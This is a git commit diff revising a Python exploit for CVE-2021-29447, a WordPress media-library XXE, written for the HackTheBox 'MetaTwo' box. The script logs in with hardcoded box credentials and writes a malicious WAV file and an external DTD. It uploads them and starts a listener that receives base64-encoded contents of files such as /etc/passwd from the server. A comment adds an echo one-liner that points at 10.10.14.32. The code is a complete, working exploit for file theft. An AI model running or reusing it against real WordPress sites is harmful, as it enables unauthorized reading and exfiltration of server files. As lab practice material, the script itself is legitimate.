affd4798fb0033c097add4d2e55e4a82cc4f5364
poorduck <rj10110@yahoo.com>
2023-05-06 12:29:20 +0530

    Fix "payload.wav" problem

--- Boxes/linux/Retired/metaTwo/src/wp-media-library-xxe.py
+++ Boxes/linux/Retired/metaTwo/src/wp-media-library-xxe.py
@@ -7,8 +7,14 @@ Description: in wordpress version 5.6.0 to 5.7.0 where an an authenticated user 
              and server-side request forgery (SSRF).
 CVE: CVE-2021-29447 https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/
 
-Usage: python3 script.py [FILENAME]
-                        where FILENAME is the full path of file want to read.
+Usage: python3 script.py [FILEPATH]
+                        where FILEPATH is the full path of file want to read.
+
+Example: python script.py '/etc/passwd'
+
+Pre-requirements:
+    - Remote rhost is added in the "/etc/hosts" file i.e "10.10.11.186 metapress.htb"
+    - HackTheBox VPN is connected on "tun0" interface
 """
 
 import requests
@@ -22,24 +28,29 @@ import netifaces as ni
 from os import path
 from sys import argv
 
+session = requests.Session()
+rhost = "http://metapress.htb"
+
+# metapress wordpress creds
+username = 'manager'
+password = 'partylikearockstar'
+
+# Enable burp proxy
+# session.proxies = {"http": "http://127.0.0.1:8080"}
+
+# Get HackTheBox vpn ip from tun0 interface
 try:
-    tun0_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
+    htb_vpn_inf = 'tun0'
+    lhost = ni.ifaddresses(htb_vpn_inf)[ni.AF_INET][0]['addr']
 except ValueError as e:
     print("[!] tun0 not found!")
     exit(e)
 
-session = requests.Session()
-# session.proxies = {"http": "http://127.0.0.1:8080"}
-
-host = 'http://metapress.htb'
-username = 'manager'
-password = 'partylikearockstar'
-
 # Login to wordpress and get auth session
-def login_to_wordpress(login_url, username, password):
+def login_to_wordpress(url, username, password):
 
     # get the login page to extract the login form fields
-    login_page = session.get(login_url)
+    login_page = session.get(f"{url}/wp-login.php")
     soup = BeautifulSoup(login_page.content, 'html.parser')
     form = soup.find('form', {'id': 'loginform'})
 
@@ -67,10 +78,10 @@ def login_to_wordpress(login_url, username, password):
         return False
 
 # File upload function in wordpress "Media Library" 
-def wp_media_library_upload(upload_url, username, password, filename):
+def wp_media_library_upload(url, username, password, filename):
 
     # log in to WordPress
-    login_success = login_to_wordpress(login_url=f"{host}/wp-login.php", username=username, password=password)
+    login_success = login_to_wordpress(url=url, username=username, password=password)
     if not login_success:
         print("[-] Login failed.")
         return False
@@ -80,7 +91,7 @@ def wp_media_library_upload(upload_url, username, password, filename):
         image_data = f.read()
 
     # Grab _wpnonce
-    res = session.get(f"{host}/wp-admin/media-new.php")
+    res = session.get(f"{url}/wp-admin/media-new.php")
     wp_nonce = findall(r'name="_wpnonce" value="(\w+)"',res.text)
     if len(wp_nonce) == 0 :
         print("[-] Failed to retrieve the _wpnonce")
@@ -92,12 +103,13 @@ def wp_media_library_upload(upload_url, username, password, filename):
     file_data = {"name": (None, filename), "action": (None, "upload-attachment"), "_wpnonce": (None, _wpnonce), "async-upload": (filename, image_data)}
 
     # send the POST request to upload the image
-    response = session.post(upload_url, files=file_data)
+    response = session.post(f"{url}/wp-admin/async-upload.php", files=file_data)
 
     # check if the image was uploaded successfully
     if 'success' in response.text:
         print('[+] Image uploaded successfully!')
-        return True
+        # return True
+        pass
     elif response.status_code == '502':
         return True  # XXE triggered.
     else:
@@ -125,68 +137,79 @@ class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
             recv_data = request_path.split(' ')[1]
             recv_data = findall(r"/\?p=(.*?)$", recv_data)[0]
             base64_decoded = b64decode(recv_data).decode('UTF-8')
-            print('[+] Data received:\n'+ base64_decoded)
+            print('[+] Data received:\n\n'+ base64_decoded)
 
     def log_message(self, format, *args):
         pass
 
 # http server
-def run_http_server(port, stop_event):
+def run_http_server(port):
     try:
+        socketserver.TCPServer.allow_reuse_address = True  # Fixes "[Errno 48] Address already in use" error
         server = socketserver.TCPServer(("", port), MyHttpRequestHandler)
         print("[+] HTTP server started at port", port)
-        while not stop_event.is_set():
-            try:
-                server.serve_forever()
-            except KeyboardInterrupt:
-                break
-            # except ThreadError:
-            #     break
-        server.server_close()
+        server.serve_forever()
     except OSError as e:
-        print(e)
-    except Exception as e:
         print(e)
 
 # Generate required files for the exploit
-def init_files(get_this_file):
-    dtd = f"""<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={get_this_file}">
-<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://{tun0_ip}:8000/?p=%file;'>" >"""
-    fn1 = 'NAMEEVIL.dtd'
+def init_files(get_this, ip, server_port):
+    dtd = f"""<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={get_this}">
+<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://{ip}:{server_port}/?p=%file;'>" >"""
+    fn1 = 'EXPLOIT.dtd'
     with open(fn1, 'w') as f:
         f.write(dtd)
         print(f'[+] File {fn1} written successfully.')
 
     fn2 = 'payload.wav'
     if not path.isfile(fn2):
-        print(f'[!] File {fn2} Not Found!')
-        exit(0)
 
-        # Create "payload.wav" manually
+        # Create "payload.wav" manually. If generated file payload file not work.
         """
-        echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.32:8000/NAMEEVIL.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
+        echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.32:8000/EXPLOIT.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
         """
-        # I don't find any way to create working wav file using python.
+
+        # hex_value = $(xxd -p -c 1000 payload.wav)
+        # formatted_hex = "".join(["\\x" + hex_value[i:i+2] for i in range(0, len(hex_value), 2)])
+        
+        WAV_BYTES = b"\x52\x49\x46\x46\xb8\x00\x00\x00\x57\x41\x56\x45\x69\x58\x4d\x4c\x7b\x00\x00\x00\x3c\x3f\x78\x6d\x6c\x20"
+        WAV_BYTES += b"\x76\x65\x72\x73\x69\x6f\x6e\x3d\x22\x31\x2e\x30\x22\x3f\x3e\x3c\x21\x44\x4f\x43\x54\x59\x50\x45\x20\x41"
+        WAV_BYTES += b"\x4e\x59\x5b\x3c\x21\x45\x4e\x54\x49\x54\x59\x20\x25\x20\x72\x65\x6d\x6f\x74\x65\x20\x53\x59\x53\x54\x45"
+        WAV_BYTES += bytes(f"\x4d\x20\x27\x68\x74\x74\x70\x3a\x2f\x2f{ip}\x3a{server_port}\x2f", encoding='latin1')
+        WAV_BYTES += b"\x45\x58\x50\x4c\x4f\x49\x54\x2e\x64\x74\x64\x27\x3e\x25\x72\x65\x6d\x6f\x74\x65\x3b\x25\x69\x6e\x69\x74"
+        WAV_BYTES += b"\x3b\x25\x74\x72\x69\x63\x6b\x3b\x5d\x3e\x00"
+
+        with open(fn2, 'wb') as f:
+            f.write(WAV_BYTES)
+
+    return fn1, fn2
 
 
 if __name__ == '__main__':
+
+    srv_port = 8000
+    dtd_fn = ""
+
     try:
-        init_files(get_this_file=argv[1])
+        filepath = argv[1]
+    except IndexError as e:
+        exit("Usage: script.py [FILEPATH]")
+
+    try:
+        dtd_fn, payload_fn = init_files(get_this=filepath, ip=lhost, server_port=srv_port)
 
         # start the HTTP server in a separate thread
-        stop_event = threading.Event()
-        server_thread = threading.Thread(target=run_http_server, args=(8000, stop_event))
+        server_thread = threading.Thread(target=run_http_server, args=(srv_port,))
         server_thread.daemon = True
         server_thread.start()
 
         # upload the image to WordPress
-        success = wp_media_library_upload(upload_url=f"{host}/wp-admin/async-upload.php", username=username, password=password, filename="payload.wav")
+        success = wp_media_library_upload(url=rhost, username=username, password=password, filename=payload_fn)
 
-        # wait for the flag to be set and close the HTTP server
-        if success or not success:
-            stop_event.set()
-            server_thread.join(timeout=5.0)  # Threading is not implemented correctly(?), Or there something else. Because after script exit, running it again immediately cause OSError.
-    except IndexError as e:
-        print(f"Usage: {argv[0]} <filename>")
+    except KeyboardInterrupt as e:
+        print(e)
     except Exception as e:
         print(e)
+    finally:
+        if dtd_fn:
+            import os; os.remove(dtd_fn) if os.path.isfile(dtd_fn) else None
